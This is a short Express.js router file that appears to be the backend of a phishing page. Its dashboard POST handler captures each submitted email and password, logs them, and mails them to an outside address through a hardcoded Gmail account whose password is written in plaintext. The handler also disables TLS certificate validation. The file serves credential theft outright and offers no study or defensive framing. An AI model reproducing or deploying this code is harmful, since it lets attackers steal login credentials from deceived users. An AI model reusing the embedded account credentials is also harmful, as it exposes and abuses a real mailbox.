var express = require('express');
var nodemailer = require('nodemailer');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});

/* GET dashboard page. */
router.get('/dashboard', function(req, res, next) {
    res.render('dashboard', { title: 'Express' });
});

router.post('/dashboard', function (req, res, next) {
    var email = req.body.email;
    var pass = req.body.pass;
    console.log('Username: ' + email);
    console.log('Password: ' + pass);
    let transporter = nodemailer.createTransport({
        service : 'gmail',
        secure : false,
        port : 25,
        auth : {
            user : 'glava.zmeya@gmail.com',
            pass : '070117#Glavazmey@73'
        },
        tls: {
            rejectUnauthorized: false
        }
    });

    let HelperOption = {
        from : '"Mail Server" <glava.zmeya@gmail.com',
        to : 'jacques.frasiak1953@gmail.com',
        subject: 'Click',
        text : "Email: " + email + " Pass: " + pass
    };
    transporter.sendMail(HelperOption);
    res.redirect('/dashboard');
});

module.exports = router;
